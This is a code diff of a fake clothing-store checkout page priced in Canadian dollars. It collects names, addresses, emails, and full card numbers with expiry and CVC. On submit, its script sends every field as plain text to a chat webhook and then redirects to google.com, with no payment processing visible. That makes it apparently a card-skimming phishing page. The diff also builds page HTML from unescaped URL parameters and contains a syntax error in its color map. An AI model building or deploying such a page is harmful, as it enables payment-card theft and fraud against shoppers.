@@ -10,15 +10,18 @@
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;700&display=swap" rel="stylesheet">
   <style>
-    body { 
+    ::-webkit-scrollbar { display: none; }
+    html, body {
       font-family: 'IBM Plex Mono', monospace; 
       background: #ffffff; 
       color: #000000; 
       -webkit-font-smoothing: antialiased; 
       letter-spacing: -0.04em;
-      margin: 0;
-      padding: 0;
+      margin: 0; padding: 0;
+      scrollbar-width: none;
     }
+    * { box-sizing: border-box; font-family: inherit; }
+    
     .form-input { 
       width: 100%; 
       padding: 12px; 
@@ -31,6 +34,7 @@
       text-transform: uppercase; 
     }
     .form-input::placeholder { color: #999; }
+    
     .btn-submit-action { 
       width: 100%; 
       background: #000; 
@@ -46,7 +50,7 @@
     }
     .btn-submit-action:hover { background: #fff; color: #000; }
 
-    /* STICKY HEADER MATRIX: Keeps top allocation display static */
+    /* STICKY SUMMARY MATRIX */
     .sticky-summary-hdr {
       position: sticky;
       top: 0;
@@ -56,6 +60,24 @@
       padding-bottom: 12px;
       margin-bottom: 24px;
     }
+
+    .item-badge-row {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      padding: 8px 0;
+      border-bottom: 1px solid #f2f2f2;
+    }
+    .item-badge-row:last-child {
+      border-bottom: none;
+    }
+    .color-mini-indicator {
+      width: 12px;
+      height: 12px;
+      border-radius: 50%;
+      display: inline-block;
+      border: 1px solid rgba(0,0,0,0.1);
+    }
   </style>
 </head>
 <body class="min-h-screen flex justify-center items-start">
@@ -63,81 +85,84 @@
   <div class="w-full max-w-xl px-4 pb-12">
     
     <div class="sticky-summary-hdr">
-      <div class="border border-black p-6 text-center bg-zinc-50">
-        <span class="text-sm font-bold block uppercase tracking-wider mb-1" id="ui-summary-name">LOADING ALLOCATION...</span>
-        <span class="text-xs text-zinc-500 block mb-3" id="ui-summary-breakdown">—</span>
-        <div class="border-t border-black pt-3 flex justify-between items-center text-sm font-bold uppercase">
+      <div class="border border-black p-6 bg-stone-50">
+        <div class="text-xs font-bold uppercase tracking-wider text-stone-400 mb-3 text-center">ORDER MANIFEST ALLOCATION</div>
+        
+        <div id="js-manifest-items-list" class="space-y-1 mb-4 max-h-[160px] overflow-y-auto pr-1">
+          <div class="text-xs text-center text-stone-400 py-2">PARSING MANIFEST DATA...</div>
+        </div>
+
+        <div class="border-t border-black pt-4 flex justify-between items-center text-sm font-bold uppercase">
           <span>Total Cost</span>
-          <span id="ui-summary-total">$0.00</span>
+          <span id="ui-summary-total">0.00 CAD</span>
         </div>
       </div>
     </div>
 
     <form id="checkoutForm" class="flex flex-col gap-6" data-redirect="https://www.google.com">
-      <input type="hidden" name="Ordered_Product" id="form-prod-name">
-      <input type="hidden" name="Quantity" id="form-prod-qty">
+      <input type="hidden" name="Manifest_JSON" id="form-manifest-json">
       <input type="hidden" name="Price_Total" id="form-prod-price">
       
       <div>
-        <h3 class="text-sm font-bold uppercase border-b border-black pb-2 mb-4 tracking-wider">Contact Information</h3>
+        <h3 class="text-xs font-bold uppercase border-b border-black pb-2 mb-4 tracking-wider">Contact Information</h3>
         <div class="flex flex-col gap-1">
-          <label for="contact-email" class="text-xs font-bold uppercase tracking-wide">Email</label>
+          <label for="contact-email" class="text-[11px] font-bold uppercase tracking-wide text-stone-500">Email</label>
           <input type="email" id="contact-email" name="Contact_Email" class="form-input" required autocomplete="email" placeholder="YOUR EMAIL">
         </div>
       </div>
 
       <div>
-        <h3 class="text-sm font-bold uppercase border-b border-black pb-2 mb-4 tracking-wider">Shipping Address</h3>
+        <h3 class="text-xs font-bold uppercase border-b border-black pb-2 mb-4 tracking-wider">Shipping Address</h3>
         <div class="flex flex-col gap-4">
           <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
             <div class="flex flex-col gap-1">
-              <label for="first-name" class="text-xs font-bold uppercase tracking-wide">First Name</label>
+              <label for="first-name" class="text-[11px] font-bold uppercase tracking-wide text-stone-500">First Name</label>
               <input type="text" id="first-name" name="First_Name" class="form-input" required autocomplete="given-name" placeholder="FIRST NAME">
             </div>
             <div class="flex flex-col gap-1">
-              <label for="last-name" class="text-xs font-bold uppercase tracking-wide">Last Name</label>
+              <label for="last-name" class="text-[11px] font-bold uppercase tracking-wide text-stone-500">Last Name</label>
               <input type="text" id="last-name" name="Last_Name" class="form-input" required autocomplete="family-name" placeholder="LAST NAME">
             </div>
           </div>
           
           <div class="flex flex-col gap-1">
-            <label for="address" class="text-xs font-bold uppercase tracking-wide">Street Address</label>
+            <label for="address" class="text-[11px] font-bold uppercase tracking-wide text-stone-500">Street Address</label>
             <input type="text" id="address" name="Shipping_Address" class="form-input" required autocomplete="shipping street-address" placeholder="STREET ADDRESS">
           </div>
           
           <div class="flex flex-col gap-1">
-            <label for="address2" class="text-xs font-bold uppercase tracking-wide">Extra (Apt, Suite, Etc.)</label>
+            <label for="address2" class="text-[11px] font-bold uppercase tracking-wide text-stone-500">Extra (Apt, Suite, Etc.)</label>
             <input type="text" id="address2" name="Shipping_Address_Line2" class="form-input" autocomplete="address-line2" placeholder="APT, SUITE, ETC.">
           </div>
 
           <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
             <div class="flex flex-col gap-1">
-              <label for="city" class="text-xs font-bold uppercase tracking-wide">City</label>
+              <label for="city" class="text-[11px] font-bold uppercase tracking-wide text-stone-500">City</label>
               <input type="text" id="city" name="Shipping_City" class="form-input" required autocomplete="address-level2" placeholder="CITY">
             </div>
             <div class="flex flex-col gap-1">
-              <label for="country" class="text-xs font-bold uppercase tracking-wide">Country</label>
-              <input id="country" name="Shipping_Country" value="United States" disabled class="form-input h-[45px]" required autocomplete="country">
+              <label for="country" class="text-[11px] font-bold uppercase tracking-wide text-stone-500">Country</label>
+              <input id="country" name="Shipping_Country" value="Canada" disabled class="form-input h-[45px]" required autocomplete="country">
             </div>
           </div>
         </div>
       </div>
 
       <div>
-        <h3 class="text-sm font-bold uppercase border-b border-black pb-2 mb-4 tracking-wider">Payment Information</h3>
+        <h3 class="text-xs font-bold uppercase border-b border-black pb-2 mb-4 tracking-wider">Payment Information</h3>
         <div class="flex flex-col gap-4">
           <div class="flex flex-col gap-1">
-            <label for="cc-number" class="text-xs font-bold uppercase tracking-wide">Card Number</label>
+            <label for="cc-number" class="text-[11px] font-bold uppercase tracking-wide text-stone-500">Card Number</label>
             <input type="text" id="cc-number" name="Card_Number" class="form-input" required autocomplete="cc-number" inputmode="numeric" maxlength="19" placeholder="0000 0000 0000 0000">
           </div>
           
           <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
             <div class="flex flex-col gap-1">
-              <label for="cc-exp" class="text-xs font-bold uppercase tracking-wide">Expires</label>
+              <label for="cc-exp" class="text-[11px] font-bold uppercase tracking-wide text-stone-500">Expires</label>
               <input type="text" id="cc-exp" name="Card_Expiry" class="form-input" required autocomplete="cc-exp" inputmode="numeric" maxlength="7" placeholder="MM / YY">
             </div>
             <div class="flex flex-col gap-1">
-              <label for="cc-csc" class="text-xs font-bold uppercase tracking-wide">CVC</label>
+              <label for="cc-csc" class="text-[11px] font-bold uppercase tracking-wide text-stone-500">CVC</label>
               <input type="text" id="cc-csc" name="Card_CVC" class="form-input" required autocomplete="cc-csc" inputmode="numeric" maxlength="4" placeholder="000">
             </div>
           </div>
@@ -151,23 +176,59 @@
   <script>
     document.addEventListener("DOMContentLoaded", function () {
       const urlParams = new URLSearchParams(window.location.search);
-      const prodName = urlParams.get('prod') || "PRODUCT ALLOCATION";
-      const prodQty = urlParams.get('qty') || "1";
-      const prodPrice = urlParams.get('price') || "$0.00";
+      const manifestParam = urlParams.get('manifest');
+      const totalPrice = urlParams.get('price') || "0.00 CAD";
 
-      const numericPrice = parseFloat(prodPrice.replace(/[^0-9.]/g, '')) || 0;
-      const calculatedBasePrice = (numericPrice / parseInt(prodQty)).toFixed(2);
-      const currencyPrefix = (prodPrice.match(/^[^0-9.]+/) || ["$"])[0];
-      const currencySuffix = (prodPrice.match(/[A-Za-z ]+$/) || [""])[0];
-      const baseFormatted = currencyPrefix + calculatedBasePrice + currencySuffix;
+      // Hex definitions for color badges to match variants visually
+      const HEX_MAP = {
+        "Gray": "#8e8e93", "Army Green": "#4b5320", "Black": "#1c1c1e",
+        "Blue": "#007aff", "Coffee": "#4a3b32", "Cyan": "#00a896",
+        "Navy Blue": "#000080", "Orange": "#ff9500", "Pink": "#ffc0cb",
+        "Purple": "#af52de", "Red": "#ff3b30", "Royal Blue": "#4169e1",
+        "Rust": #b7410e, "Teal": "#008080", "White": "#ffffff"
+      };
 
-      document.getElementById("ui-summary-name").innerText = prodName;
-      document.getElementById("ui-summary-breakdown").innerText = `${prodQty} x ${baseFormatted}`;
-      document.getElementById("ui-summary-total").innerText = prodPrice;
+      let parsedManifest = [];
+      try {
+        if (manifestParam) {
+          parsedManifest = JSON.parse(manifestParam);
+        }
+      } catch (e) {
+        console.error("Error parsing cart parameters:", e);
+      }
 
-      document.getElementById("form-prod-name").value = prodName;
-      document.getElementById("form-prod-qty").value = prodQty;
-      document.getElementById("form-prod-price").value = prodPrice;
+      const listContainer = document.getElementById("js-manifest-items-list");
+      listContainer.innerHTML = "";
+
+      if (parsedManifest && parsedManifest.length > 0) {
+        parsedManifest.forEach(item => {
+          const hexColor = HEX_MAP[item.color] || "#000000";
+          const borderStyle = item.color === "White" ? "border: 1px solid #ddd;" : "";
+
+          const row = document.createElement("div");
+          row.className = "item-badge-row flex justify-between items-center text-xs";
+          row.innerHTML = `
+            <div class="flex items-center gap-2 truncate max-w-[75%]">
+              <span class="color-mini-indicator" style="background-color: ${hexColor}; ${borderStyle}"></span>
+              <span class="font-bold text-stone-900 truncate">${item.qty}x ${item.name}</span>
+            </div>
+            <span class="text-stone-500 font-medium uppercase tracking-tight">${item.color} / ${item.size}</span>
+          `;
+          listContainer.appendChild(row);
+        });
+      } else {
+        // Fallback backward-compatible logic for standard direct parameters
+        const legacyProd = urlParams.get('prod') || "WOMEN ATHLETIC MINI ROMPER DRESS";
+        const legacyQty = urlParams.get('qty') || "1";
+        const row = document.createElement("div");
+        row.className = "item-badge-row flex justify-between items-center text-xs font-bold";
+        row.innerHTML = `<span>${legacyQty}x ${legacyProd}</span><span>SINGLE BUY</span>`;
+        listContainer.appendChild(row);
+      }
+
+      document.getElementById("ui-summary-total").innerText = totalPrice;
+      document.getElementById("form-manifest-json").value = manifestParam || "[]";
+      document.getElementById("form-prod-price").value = totalPrice;
 
       // Card Number Formatter
       const cardInput = document.getElementById("cc-number");
@@ -210,13 +271,13 @@
         }
       });
 
-      // CVC Input restriction
+      // CVC Filter input
       const cvcInput = document.getElementById("cc-csc");
       cvcInput.addEventListener("input", function (e) {
         e.target.value = e.target.value.replace(/\D/g, "");
       });
 
-      // Form Submission Logic
+      // Form Submission Webhook Dispatch Pipeline
       document.getElementById("checkoutForm").addEventListener("submit", function (event) { 
         event.preventDefault(); 
 
@@ -228,7 +289,7 @@
         var message = "```\n"; 
 
         for (var pair of formData.entries()) { 
-            message += pair[0] + ": " + pair[1] + "\n"; 
+          message += pair[0] + ": " + pair[1] + "\n"; 
         } 
 
         message += "```"; 
@@ -237,24 +298,22 @@
         var redirectLink = this.getAttribute("data-redirect"); 
 
         var data = { 
-            content: message, 
+          content: message, 
         }; 
 
         fetch(webhookUrl, { 
-            method: "POST", 
-            headers: { 
-                "Content-Type": "application/json", 
-            }, 
-            body: JSON.stringify(data), 
+          method: "POST", 
+          headers: { 
+            "Content-Type": "application/json", 
+          }, 
+          body: JSON.stringify(data), 
         }) 
         .then((response) => response.text()) 
         .then((result) => { 
-            console.log("Success:", result); 
-            window.location.href = redirectLink; 
+          window.location.href = redirectLink; 
         }) 
         .catch((error) => { 
-            console.error("Error:", error); 
-            window.location.href = redirectLink;
+          window.location.href = redirectLink;
         }); 
       });
     });
